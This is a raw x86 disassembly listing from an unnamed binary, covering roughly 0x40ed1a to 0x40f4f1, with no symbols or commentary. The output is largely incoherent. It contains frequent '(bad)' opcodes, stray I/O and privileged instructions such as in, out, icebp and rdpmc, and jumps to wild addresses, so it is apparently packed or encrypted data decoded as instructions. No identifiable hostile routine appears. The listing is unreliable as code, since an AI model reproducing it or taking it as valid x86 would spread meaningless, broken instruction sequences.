  40ed1a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ed20:	(bad)  
  40ed21:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ed27:	(bad)  
  40ed28:	sub    ebp,DWORD PTR [ebx]
  40ed2a:	and    al,0x52
  40ed2c:	(bad)  
  40ed2d:	dec    edi
  40ed2e:	inc    ebp
  40ed2f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ed36:	add    BYTE PTR [ebp-0x7b],dh
  40ed39:	pop    eax
  40ed3a:	add    BYTE PTR [edx+0x0],bl
  40ed3d:	pop    edx
  40ed3e:	dec    ebp
  40ed3f:	jmp    DWORD PTR [ebx]
  40ed41:	and    al,0xec
  40ed43:	push   edx
  40ed44:	out    0x64,eax
  40ed46:	jmp    0xd3f2e34b
  40ed4b:	jmp    0x40eda5
  40ed4d:	mov    al,0xfe
  40ed4f:	dec    BYTE PTR [ebp-0x18fd8018]
  40ed55:	add    BYTE PTR [esi+ebp*1],bh
  40ed58:	pop    edx
  40ed59:	icebp  
  40ed5a:	mov    eax,cs
  40ed5c:	ins    BYTE PTR es:[edi],dx
  40ed5d:	adc    eax,0x75510000
  40ed62:	mov    esi,0x70158
  40ed67:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ed6d:	mov    edi,esp
  40ed6f:	cld    
  40ed70:	jge    0x40ede7
  40ed72:	(bad)  
  40ed74:	aas    
  40ed75:	and    al,0x6d
  40ed77:	adc    cl,0x1
  40ed7a:	mov    eax,DWORD PTR [eax]
  40ed7c:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ed82:	dec    ebp
  40ed83:	add    eax,ebp
  40ed85:	add    BYTE PTR [edx],al
  40ed87:	fadd   DWORD PTR [eax]
  40ed89:	stc    
  40ed8a:	enter  0xee00,0x8b
  40ed8e:	sbb    eax,0x1
  40ed91:	sbb    esi,ecx
  40ed93:	in     al,0x0
  40ed95:	in     eax,dx
  40ed96:	add    BYTE PTR [eax],al
  40ed98:	jne    0x40ed25
  40ed9a:	cmp    edx,esp
  40ed9c:	jb     0x40eda7
  40ed9e:	jmp    0x40ee15
  40eda0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eda6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40edac:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40edb2:	jb     0x40ed3d
  40edb4:	pop    edx
  40edb5:	fadd   QWORD PTR [ebx-0x7445faa1]
  40edbb:	or     dh,BYTE PTR [edx+0x0]
  40edbe:	inc    edx
  40edbf:	or     dl,bh
  40edc1:	xlat   BYTE PTR ds:[ebx]
  40edc2:	dec    edx
  40edc3:	push   edi
  40edc4:	add    al,0x7
  40edc6:	leave  
  40edc7:	rol    DWORD PTR [edx+eax*1],0x7
  40edcb:	add    ecx,ecx
  40edcd:	mov    edx,ecx
  40edcf:	int3   
  40edd0:	jmp    0x40ed90
  40edd2:	mov    al,0x0
  40edd4:	(bad)  
  40edd5:	jne    0x40edbf
  40edd7:	mov    eax,DWORD PTR [edx]
  40edd9:	call   0xc1556ade
  40edde:	pop    edi
  40eddf:	add    ebx,DWORD PTR [ecx-0x37]
  40ede2:	pop    ecx
  40ede3:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40edea:	push   es
  40edeb:	mov    eax,DWORD PTR [eax]
  40eded:	int3   
  40edee:	add    ch,al
  40edf0:	jae    0x40edda
  40edf2:	int    0x1
  40edf4:	enter  0x3000,0x18
  40edf8:	add    BYTE PTR [ebp+0x75],al
  40edfb:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ee01:	push   0x2
  40ee03:	pop    ecx
  40ee04:	add    BYTE PTR [eax],cl
  40ee06:	push   ebx
  40ee07:	lea    edi,[edi+eax*2]
  40ee0a:	mov    al,0x1
  40ee0c:	jb     0x40ee0e
  40ee0e:	mov    al,0x10
  40ee10:	push   eax
  40ee11:	add    al,0x75
  40ee13:	add    BYTE PTR [ebx],ch
  40ee15:	add    ebx,esp
  40ee17:	int3   
  40ee18:	jne    0x40ee2a
  40ee1a:	movsx  edx,cl
  40ee1d:	add    DWORD PTR [eax],eax
  40ee1f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ee26:	mov    gs,edi
  40ee28:	add    BYTE PTR [eax-0x50],ch
  40ee2b:	add    al,ch
  40ee2d:	mov    eax,DWORD PTR [ecx]
  40ee2f:	sub    eax,DWORD PTR [eax]
  40ee31:	jb     0x40eea8
  40ee33:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ee37:	jge    0x40ee21
  40ee39:	add    al,0x1
  40ee3b:	add    DWORD PTR [eax],0x0
  40ee3e:	jne    0x40ee40
  40ee40:	je     0x40ee87
  40ee42:	mov    eax,DWORD PTR [edi]
  40ee44:	ror    BYTE PTR [ebp+0x4d],1
  40ee47:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ee4e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ee54:	mov    DWORD PTR [ebx],ebp
  40ee56:	fadd   DWORD PTR [eax+0x75]
  40ee59:	inc    eax
  40ee5a:	pop    eax
  40ee5b:	lea    ebx,[ecx+0x4f]
  40ee5e:	push   0xb1000003
  40ee63:	out    dx,eax
  40ee64:	add    ebp,DWORD PTR [edx+edx*2]
  40ee67:	add    BYTE PTR [ebx+ecx*4],bh
  40ee6a:	mov    ch,BYTE PTR [ebx]
  40ee6c:	jb     0x40eee0
  40ee6e:	add    al,0x89
  40ee70:	push   eax
  40ee71:	call   0x84293be3
  40ee76:	add    DWORD PTR [eax+eax*1],eax
  40ee79:	jae    0x40ee8f
  40ee7b:	icebp  
  40ee7c:	inc    ebp
  40ee7d:	mov    eax,DWORD PTR gs:[ecx]
  40ee80:	int3   
  40ee81:	out    dx,al
  40ee82:	loopne 0x40eed1
  40ee84:	sub    eax,DWORD PTR [edx]
  40ee86:	push   0xffffff83
  40ee88:	pop    esi
  40ee89:	push   cs
  40ee8a:	jl     0x40eea5
  40ee8c:	add    al,0xaf
  40ee8e:	xor    eax,0x832b6d00
  40ee93:	mov    eax,DWORD PTR [edx]
  40ee95:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40ee9b:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40eea1:	inc    ebp
  40eea2:	shr    ebx,0x3
  40eea5:	or     DWORD PTR [eax],0x4
  40eea8:	push   0xffffffa5
  40eeaa:	pop    esi
  40eeab:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40eeb2:	jmp    0x40ef11
  40eeb4:	mov    edi,0xff0272
  40eeb9:	fdivr  QWORD PTR [ebp+0x5d]
  40eebc:	push   0x4e
  40eebe:	pop    ecx
  40eebf:	call   0x4132c4
  40eec4:	mov    DWORD PTR [ebx],eax
  40eec6:	in     al,0xc8
  40eec8:	rol    BYTE PTR [ebp-0x75],0xc1
  40eecc:	call   0xaaf0ad
  40eed1:	pop    esi
  40eed2:	enter  0xceff,0x8b
  40eed6:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eeda:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40eee1:	je     0x40eee3
  40eee3:	or     DWORD PTR [ebx-0x74183b24],eax
  40eee9:	jne    0x40eecf
  40eeeb:	jmp    0x40eee6
  40eeed:	push   DWORD PTR [edx-0x24]
  40eef0:	push   0x4d
  40eef2:	pop    ecx
  40eef3:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40eef7:	jge    0x40eeff
  40eef9:	mov    eax,eax
  40eefb:	sub    ebp,DWORD PTR [edx+0x24]
  40eefe:	pop    esi
  40eeff:	inc    ebp
  40ef00:	mov    esp,0x8b6077
  40ef05:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40ef0b:	lods   al,BYTE PTR ds:[esi]
  40ef0c:	add    BYTE PTR [ebx],bh
  40ef0e:	enter  0xce73,0x49
  40ef12:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40ef1a:	stc    
  40ef1b:	jge    0x40ef8f
  40ef1d:	jnp    0xdd40727e
  40ef23:	call   0xc3eff9
  40ef28:	fadd   st(0),st
  40ef2a:	dec    esi
  40ef2b:	ins    BYTE PTR es:[edi],dx
  40ef2c:	stc    
  40ef2d:	cmp    al,0x73
  40ef2f:	push   ebp
  40ef30:	mov    eax,0xf8028b
  40ef35:	jne    0x40eef8
  40ef37:	mov    esi,ecx
  40ef39:	mov    esp,DWORD PTR [ebp+0x2c]
  40ef3c:	add    edi,DWORD PTR [ebp-0x24]
  40ef3f:	sub    esp,eax
  40ef41:	and    al,0x45
  40ef43:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40ef49:	sbb    al,0xee
  40ef4b:	pop    esi
  40ef4c:	call   0x80ef7c
  40ef51:	fsubr  st,st(3)
  40ef53:	sti    
  40ef54:	add    BYTE PTR gs:[ecx],bh
  40ef57:	add    eax,esp
  40ef59:	add    DWORD PTR [esi],eax
  40ef5b:	rol    DWORD PTR [ebp+0x8],0x29
  40ef5f:	mov    esp,eax
  40ef61:	clc    
  40ef62:	jne    0x40efd9
  40ef64:	mov    eax,0x8b0673
  40ef69:	loopne 0x40efb0
  40ef6b:	loopne 0x40eef6
  40ef6d:	lods   al,BYTE PTR ds:[esi]
  40ef6e:	int3   
  40ef6f:	inc    ebp
  40ef70:	mov    DWORD PTR gs:[eax+edi*8],eax
  40ef74:	add    al,0xc3
  40ef76:	sub    ecx,DWORD PTR [ebp+0x47]
  40ef79:	(bad)  
  40ef7b:	shr    BYTE PTR [ebp-0x1f],0xe8
  40ef7f:	add    eax,DWORD PTR [eax]
  40ef81:	call   0x642b086
  40ef86:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40ef8c:	dec    esi
  40ef8d:	ins    DWORD PTR es:[edi],dx
  40ef8e:	in     al,dx
  40ef8f:	lea    eax,[eax]
  40ef91:	inc    ebp
  40ef92:	inc    ebp
  40ef93:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40ef99:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40efa3:	and    al,0xdc
  40efa5:	ror    DWORD PTR [edx+0x24],0xf7
  40efa9:	or     BYTE PTR [ebp+0x4c],dh
  40efac:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40efb0:	stos   BYTE PTR es:[edi],al
  40efb1:	adc    edx,edi
  40efb3:	inc    esp
  40efb4:	add    edi,DWORD PTR [eax]
  40efb6:	jne    0x40ef9b
  40efb8:	mov    DWORD PTR [eax-0x7449db04],ecx
  40efbe:	cmp    ecx,DWORD PTR [edi]
  40efc0:	sub    BYTE PTR [ebp-0x7e],dl
  40efc3:	sar    ebp,0xb
  40efc6:	jmp    FWORD PTR [edi+0x2400392a]
  40efcc:	sub    esi,DWORD PTR [ebx-0x73]
  40efcf:	mov    esp,DWORD PTR [ecx+edi*4]
  40efd2:	mov    ecx,DWORD PTR [eax]
  40efd4:	and    BYTE PTR [eax],al
  40efd6:	jne    0x40efa2
  40efd8:	sub    ebp,ecx
  40efda:	sbb    BYTE PTR [esi+0x32],ah
  40efdd:	dec    ebp
  40efde:	push   ebp
  40efdf:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40efe5:	ret    
  40efe6:	mov    edx,ebp
  40efe8:	leave  
  40efe9:	sub    DWORD PTR [esi+0x24],ebx
  40efec:	ret    0x2b
  40efef:	pop    ax
  40eff1:	push   ebp
  40eff2:	rol    BYTE PTR [ebx],0xeb
  40eff5:	add    DWORD PTR [ecx+0x6c0001],0x40
  40effc:	jb     0x40f053
  40effe:	ret    
  40efff:	in     al,dx
  40f000:	jecxz  0x40ef8d
  40f002:	push   esi
  40f003:	xchg   esp,eax
  40f004:	jne    0x40f006
  40f006:	cmp    edx,DWORD PTR [esi+0x1c]
  40f009:	jne    0x40efef
  40f00b:	mov    eax,DWORD PTR [ebp-0x77]
  40f00e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f015:	mov    esi,DWORD PTR [ebp-0x75]
  40f018:	pop    esi
  40f019:	nop
  40f01a:	mov    eax,DWORD PTR [eax]
  40f01c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f022:	add    al,0x0
  40f024:	inc    ebp
  40f025:	mov    eax,DWORD PTR [ebx]
  40f027:	mov    ebp,ebx
  40f029:	cmp    al,0xf
  40f02b:	or     al,al
  40f02d:	inc    ebp
  40f02e:	inc    ebp
  40f02f:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  40f035:	cld    
  40f036:	add    BYTE PTR [edi+0x546c16c0],dh
  40f03c:	add    BYTE PTR [ecx-0x5],dl
  40f03f:	add    eax,0x17200
  40f044:	sbb    al,0x85
  40f046:	dec    esp
  40f047:	je     0x40f081
  40f049:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f04d:	add    BYTE PTR [ebx],bh
  40f04f:	(bad)  
  40f050:	and    al,0x32
  40f052:	jae    0x40eff0
  40f054:	mov    cl,cl
  40f056:	inc    DWORD PTR [esp]
  40f059:	push   ebp
  40f05a:	shr    esp,0x8
  40f05d:	in     al,dx
  40f05e:	push   esp
  40f05f:	add    DWORD PTR [eax],esp
  40f061:	add    bl,cl
  40f063:	inc    ebp
  40f064:	mov    bh,0x53
  40f066:	add    BYTE PTR [ebp-0x17],al
  40f069:	push   esi
  40f06a:	cmovne ecx,edx
  40f06d:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f071:	push   edi
  40f072:	pop    ss
  40f073:	xor    ecx,ebx
  40f075:	pushf  
  40f076:	add    BYTE PTR [ecx+0x452bf800],cl
  40f07c:	rcr    ecx,0x5
  40f07f:	inc    ebp
  40f080:	add    edx,ebx
  40f082:	add    BYTE PTR [ebp-0x40],al
  40f085:	out    0x6c,eax
  40f087:	inc    ebp
  40f088:	inc    eax
  40f089:	sub    eax,0x450546c1
  40f08e:	dec    esp
  40f08f:	sub    al,0x20
  40f091:	inc    ebp
  40f092:	fnstcw WORD PTR [esi+0x29]
  40f095:	leave  
  40f096:	add    BYTE PTR [esi+0xc000c0],bh
  40f09c:	lea    eax,[esp-0x40]
  40f0a0:	ret    
  40f0a1:	mov    dh,0x8b
  40f0a3:	xor    edx,DWORD PTR [ecx+0x3]
  40f0a6:	mov    al,BYTE PTR [ecx+0x1]
  40f0a9:	sbb    BYTE PTR [eax],al
  40f0ab:	stc    
  40f0ac:	mov    esi,DWORD PTR [edx+0x8]
  40f0af:	(bad)  
  40f0b0:	ss mov eax,0xb98ac631
  40f0b6:	add    esi,eax
  40f0b8:	add    BYTE PTR [edx-0x444d39f7],bh
  40f0be:	add    esi,eax
  40f0c0:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  40f0c7:	mov    BYTE PTR [eax],0xbe
  40f0ca:	or     BYTE PTR [ebx],dh
  40f0cc:	dec    ecx
  40f0cd:	lea    eax,[ebx]
  40f0cf:	or     eax,0x18fc0fc7
  40f0d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d5:	(bad)  
  40f0d7:	fiadd  WORD PTR [ebp-0x78]
  40f0da:	jae    0xed75f829
  40f0e0:	or     BYTE PTR [ebp+0x7],al
  40f0e3:	in     eax,dx
  40f0e4:	fwait
  40f0e5:	inc    ebp
  40f0e6:	xor    ah,dh
  40f0e8:	pop    esi
  40f0e9:	inc    ebp
  40f0ea:	shl    edx,0xc
  40f0ed:	inc    ebp
  40f0ee:	sub    cl,0x1
  40f0f1:	inc    ebp
  40f0f2:	add    bh,bl
  40f0f4:	add    BYTE PTR [ebp-0x7b],al
  40f0f7:	out    dx,al
  40f0f8:	clc    
  40f0f9:	inc    ebp
  40f0fa:	ret    0xe7
  40f0fd:	inc    ebp
  40f0fe:	mov    edi,DWORD PTR [esi-0x7f]
  40f101:	leave  
  40f102:	and    al,0x44
  40f104:	add    BYTE PTR [eax+0x331cb68b],dh
  40f10a:	mov    DWORD PTR [ebx],eax
  40f10c:	sbb    al,0x41
  40f10e:	(bad)  
  40f10f:	sbb    al,ah
  40f111:	stc    
  40f112:	test   DWORD PTR [edx-0x8],esi
  40f115:	lea    edi,[edi-0x7007a98]
  40f11b:	mov    DWORD PTR [ebp-0x2c],edi
  40f11e:	(bad)  
  40f11f:	dec    ebp
  40f120:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  40f127:	add    edx,eax
  40f129:	(bad)  
  40f12a:	(bad)  
  40f12b:	inc    ebx
  40f12d:	jmp    FWORD PTR [edx-0x38]
  40f130:	(bad)  
  40f131:	or     al,ah
  40f133:	jge    0x40f0fb
  40f135:	mov    ebp,0x5a8533e4
  40f13b:	clc    
  40f13c:	enter  0x45,0x8b
  40f140:	lea    ecx,[ebp+ecx*1+0x18330f00]
  40f147:	mov    edi,0x7de08da
  40f14c:	mov    BYTE PTR [ebx+0x39063283],bl
  40f152:	in     eax,dx
  40f153:	cmovne edx,ebx
  40f156:	jmp    0x40f158
  40f158:	inc    ebp
  40f159:	mov    ebp,ebp
  40f15b:	sbb    al,0x45
  40f15d:	mov    ebx,ebx
  40f15f:	add    DWORD PTR [ebp+0x0],eax
  40f162:	in     al,dx
  40f163:	add    DWORD PTR [ebp+0x4d],eax
  40f166:	sub    eax,0x2c80458b
  40f16b:	add    BYTE PTR [ebp-0x77],al
  40f16e:	jle    0x40f1da
  40f170:	leave  
  40f171:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6e6
  40f179:	inc    ebp
  40f17a:	add    ebx,edi
  40f17c:	inc    ecx
  40f17d:	out    0x18,eax
  40f17f:	(bad)  
  40f180:	stc    
  40f181:	int3   
  40f182:	jb     0x40f10e
  40f184:	(bad)  
  40f185:	xor    dh,BYTE PTR [eax-0x4ec73980]
  40f18b:	or     dh,al
  40f18d:	dec    esi
  40f18e:	mov    dl,0xf3
  40f190:	mov    BYTE PTR [ebp-0x4d],0x89
  40f194:	(bad)  
  40f195:	loopne 0x40f14b
  40f197:	inc    esi
  40f199:	lea    esi,[ebp-0x49003924]
  40f19f:	push   eax
  40f1a0:	mov    BYTE PTR [ebp-0x49],0x33
  40f1a4:	xor    eax,DWORD PTR [ebx]
  40f1a6:	lea    edx,[eax+0xd]
  40f1a9:	inc    ebp
  40f1aa:	jae    0x8c1b57c8
  40f1b0:	ficomp WORD PTR [eax+ecx*4]
  40f1b3:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f1ba:	test   esi,edi
  40f1bc:	(bad)  
  40f1bd:	(bad)  
  40f1be:	inc    DWORD PTR [eax]
  40f1c0:	inc    ebp
  40f1c1:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  40f1c7:	test   DWORD PTR [ebx],edx
  40f1c9:	jne    0x40f154
  40f1cb:	or     DWORD PTR [ebx-0xed9771],0x75703b8e
  40f1d5:	jmp    0x124f263
  40f1da:	inc    ebp
  40f1db:	jne    0x40f1c9
  40f1dd:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  40f1e4:	mov    BYTE PTR [ebp+0x45009c01],cl
  40f1ea:	shl    BYTE PTR [eax],0x54
  40f1ed:	push   cx
  40f1ef:	mov    bx,0x7245
  40f1f3:	gs add bh,al
  40f1f6:	add    DWORD PTR [ebp+eax*4+0xe601df],ebx
  40f1fd:	inc    ebp
  40f1fe:	dec    ebp
  40f1ff:	int3   
  40f200:	mov    esp,ebx
  40f202:	jl     0x40f1cb
  40f204:	add    BYTE PTR [ecx+ecx*4+0x1ce28bdb],ah
  40f20b:	inc    ebp
  40f20c:	mov    edi,ebx
  40f20e:	add    ebp,esp
  40f210:	add    BYTE PTR [esi+0x1],ah
  40f213:	inc    ebp
  40f214:	or     BYTE PTR [edi],bh
  40f216:	inc    ebp
  40f217:	(bad)  
  40f218:	in     eax,dx
  40f219:	fsubr  st(2),st
  40f21b:	inc    edi
  40f21d:	add    dl,al
  40f21f:	add    dh,ch
  40f221:	call   0x860aa4
  40f226:	pop    esi
  40f227:	test   DWORD PTR [eax],ecx
  40f229:	dec    dl
  40f22b:	(bad)  
  40f22c:	jmp    0x413f7ab6
  40f231:	push   DWORD PTR [ebp-0x75]
  40f234:	(bad)  
  40f235:	loopne 0x40f203
  40f237:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  40f241:	push   eax
  40f242:	inc    DWORD PTR [ebp-0x75]
  40f245:	mov    esp,eax
  40f247:	cwde   
  40f248:	mov    DWORD PTR [eax],0xff8bffc3
  40f24e:	sbb    al,0x8
  40f250:	ror    BYTE PTR [ebp+0x50],0x51
  40f254:	inc    ebp
  40f255:	ror    BYTE PTR [ebx+0x65987d],1
  40f25b:	test   edi,eax
  40f25d:	add    al,0xdc
  40f25f:	add    bh,bh
  40f261:	push   0x1
  40f263:	add    BYTE PTR [eax],al
  40f265:	mov    edi,edi
  40f267:	inc    WORD PTR [ebp+0x8]
  40f26b:	add    eax,0xd
  40f26e:	(bad)  
  40f270:	xor    eax,0x782ec89
  40f275:	push   ecx
  40f276:	cli    
  40f277:	popw   es
  40f279:	push   ebp
  40f27a:	xchg   BYTE PTR [ebx-0x76740800],al
  40f280:	sbb    al,0x86
  40f282:	test   DWORD PTR [ecx-0x2],edx
  40f285:	call   WORD PTR [ebp-0x40]
  40f289:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  40f28d:	mov    eax,ebx
  40f28f:	mov    dh,BYTE PTR ds:0xc7666851
  40f295:	push   ebp
  40f296:	fsub   QWORD PTR [esi+0x0]
  40f299:	dec    ebp
  40f29a:	inc    ebp
  40f29b:	mov    edx,0xea4ece
  40f2a0:	(bad)  
  40f2a1:	retf   0x89a0
  40f2a4:	fist   DWORD PTR [eax+0x454ae1]
  40f2aa:	call   0xc7a72f3a
  40f2af:	mov    ch,0xa8
  40f2b1:	jmp    eax
  40f2b3:	(bad)  
  40f2b4:	in     eax,dx
  40f2b5:	lock (bad) 
  40f2b7:	mov    DWORD PTR [esi+ebp*2-0x727a0082],ebp
  40f2be:	(bad)  
  40f2bf:	xor    eax,0x700089ff
  40f2c4:	add    bh,bh
  40f2c6:	stos   DWORD PTR es:[edi],eax
  40f2c7:	data16 add BYTE PTR [ebp-0x1b0077],al
  40f2ce:	inc    DWORD PTR [ecx-0x73]
  40f2d1:	data16 fadd QWORD PTR [ebp-0xaf0001]
  40f2d8:	inc    ebp
  40f2d9:	shl    BYTE PTR [ebx],0x66
  40f2dc:	add    eax,DWORD PTR [ebp-0xba00b0]
  40f2e2:	add    DWORD PTR [ecx+0x44],0x66
  40f2e6:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  40f2ec:	add    DWORD PTR [ecx-0xcf8600],ecx
  40f2f2:	push   ebp
  40f2f3:	lea    dx,[ebp-0x28]
  40f2fa:	add    BYTE PTR [ebp-0x25],0xf
  40f2fe:	jge    0xff41f205
  40f304:	mov    ecx,0xc34fc7
  40f309:	rol    ecx,0x89
  40f30c:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  40f310:	ror    BYTE PTR [ebx-0x48990775],0x55
  40f317:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  40f31e:	test   BYTE PTR [ecx-0x3f997f3e],cl
  40f324:	push   ebp
  40f325:	mov    DWORD PTR [ebp-0x76761880],ecx
  40f32b:	or     BYTE PTR [eax+0x6600c265],0x45
  40f332:	push   ebp
  40f333:	xor    DWORD PTR [ebp-0x76381e64],ecx
  40f339:	aam    0x8c
  40f33b:	test   DWORD PTR [ecx-0x3dba7108],ecx
  40f341:	cmp    eax,0xc78b9c00
  40f346:	data16 hlt 
  40f348:	dec    ebp
  40f349:	test   DWORD PTR [ecx+0x454ff8],edi
  40f34f:	xor    ecx,esi
  40f351:	lahf   
  40f352:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  40f358:	mov    eax,DWORD PTR [ecx]
  40f35a:	data16 add BYTE PTR [ebp-0x7400bb],dh
  40f361:	sbb    al,0x71
  40f363:	dec    ebp
  40f364:	mov    si,WORD PTR [ebp-0xff0074]
  40f36b:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  40f371:	add    BYTE PTR [ebp-0x760fd877],cl
  40f377:	jne    0x40f3ed
  40f379:	test   edi,edi
  40f37b:	jne    0x40f300
  40f37d:	(bad)  
  40f37e:	sti    
  40f37f:	sbb    BYTE PTR [ecx-0x1789ab],cl
  40f385:	cld    
  40f386:	(bad)  
  40f387:	jmp    DWORD PTR [ecx]
  40f389:	inc    ebp
  40f38a:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  40f390:	data16 cmp al,0x8d
  40f393:	push   cs
  40f394:	inc    DWORD PTR [ebp-0x1]
  40f397:	test   DWORD PTR [ecx-0x838c],ecx
  40f39d:	sbb    al,0x8b
  40f39f:	lock clc 
  40f3a1:	push   DWORD PTR [edi-0xe39375]
  40f3a7:	xor    BYTE PTR [ebx],0x1
  40f3aa:	add    eax,DWORD PTR [eax]
  40f3ac:	xor    eax,DWORD PTR [eax]
  40f3ae:	mov    WORD PTR [ebp-0xba003d],0x4575
  40f3b7:	mov    ecx,DWORD PTR [edi]
  40f3b9:	sbb    al,0x4d
  40f3bb:	mov    DWORD PTR [ebx],esi
  40f3bd:	add    DWORD PTR [ebx],eax
  40f3bf:	add    BYTE PTR [ebx],dh
  40f3c1:	xor    DWORD PTR [esi-0x80],esp
  40f3c4:	inc    ebp
  40f3c5:	add    DWORD PTR [ebx],esi
  40f3c7:	add    BYTE PTR [esi+0x50],ah
  40f3ca:	inc    ebp
  40f3cb:	jmp    0x85f636
  40f3d0:	add    DWORD PTR [eax+0xc70194],0xffffffec
  40f3d7:	or     BYTE PTR [ebp+0x4501f845],dh
  40f3dd:	jmp    0xdcf6d3
  40f3e2:	(bad)  
  40f3e3:	push   cs
  40f3e4:	in     al,0xc9
  40f3e6:	test   DWORD PTR [ebp+0x4502f8],eax
  40f3ec:	xor    ecx,DWORD PTR [ebp-0x64]
  40f3ef:	mov    eax,edi
  40f3f1:	mov    esp,esp
  40f3f3:	push   eax
  40f3f4:	add    eax,0x45fff885
  40f3f9:	dec    DWORD PTR [ebx+0x339445]
  40f3ff:	add    ecx,DWORD PTR [ecx+0x452ce889]
  40f405:	dec    DWORD PTR [ebx-0x4e0be375]
  40f40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f40c:	add    edi,edi
  40f40e:	add    bh,bh
  40f410:	push   cs
  40f411:	xor    eax,DWORD PTR [eax+0x890103]
  40f417:	xor    BYTE PTR [ebp-0x1],al
  40f41a:	mov    DWORD PTR [ebp-0x36df38],ecx
  40f420:	push   cs
  40f421:	push   eax
  40f422:	jne    0x40f469
  40f424:	mov    esi,DWORD PTR [ebx]
  40f426:	sbb    al,0x3
  40f428:	jne    0x40f47a
  40f42a:	inc    DWORD PTR [ebp-0x75]
  40f42d:	add    eax,0x800f0
  40f432:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  40f438:	mov    DWORD PTR [ecx],eax
  40f43a:	sbb    BYTE PTR [eax],al
  40f43c:	leave  
  40f43d:	test   DWORD PTR [edi-0x1],eax
  40f440:	jne    0x40f441
  40f442:	call   0xff41df47
  40f447:	xor    BYTE PTR [ebp+0x4d],al
  40f44a:	mov    edi,edi
  40f44c:	enter  0x8,0x4d
  40f450:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  40f456:	mov    eax,DWORD PTR [eax]
  40f458:	sbb    al,0x1
  40f45a:	sbb    DWORD PTR [ebp+0x4d],eax
  40f45d:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  40f463:	inc    eax
  40f464:	dec    DWORD PTR [ecx-0x27d775]
  40f46a:	add    BYTE PTR [ebx-0x38d72b01],cl
  40f470:	xchg   ecx,eax
  40f471:	ret    
  40f472:	add    BYTE PTR [ebp-0x830075],al
  40f478:	add    BYTE PTR [ebp-0x75],al
  40f47b:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  40f481:	lea    edi,[edi+0x20]
  40f484:	add    bh,bh
  40f486:	mov    edx,DWORD PTR [eax-0x7b]
  40f489:	inc    ebp
  40f48a:	rdpmc  
  40f48c:	jne    0x40f491
  40f48e:	add    BYTE PTR [eax-0x75],dl
  40f491:	inc    ebp
  40f492:	call   0x4040fd9c
  40f497:	add    BYTE PTR [ecx-0xe3d775],cl
  40f49d:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  40f4a4:	ret    
  40f4a5:	inc    DWORD PTR [ebp-0xff0001]
  40f4ab:	add    BYTE PTR [ebp-0x4b],al
  40f4ae:	cmp    edi,0x24
  40f4b1:	(bad)  
  40f4b2:	push   DWORD PTR [eax]
  40f4b4:	add    BYTE PTR [ebp-0x39],dl
  40f4b7:	test   ebx,eax
  40f4b9:	je     0x40f440
  40f4bb:	mov    edi,edi
  40f4bd:	sbb    bh,bh
  40f4bf:	test   DWORD PTR gs:[eax],eax
  40f4c2:	(bad)  
  40f4c3:	js     0x40f4c4
  40f4c5:	add    BYTE PTR [ebx-0x38b21fdd],cl
  40f4cb:	sub    eax,ebx
  40f4cd:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  40f4d3:	add    eax,DWORD PTR [eax]
  40f4d5:	dec    ebp
  40f4d6:	push   eax
  40f4d7:	mov    al,BYTE PTR [ebp+0x1]
  40f4da:	mov    eax,DWORD PTR [ebp-0x68]
  40f4dd:	mov    eax,DWORD PTR [eax]
  40f4df:	cld    
  40f4e0:	(bad)  
  40f4e1:	or     BYTE PTR [eax],ah
  40f4e3:	dec    ebp
  40f4e4:	inc    DWORD PTR [eax+0x4]
  40f4e7:	push   ecx
  40f4e8:	add    BYTE PTR [edx-0x1],dh
  40f4eb:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  40f4f1:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
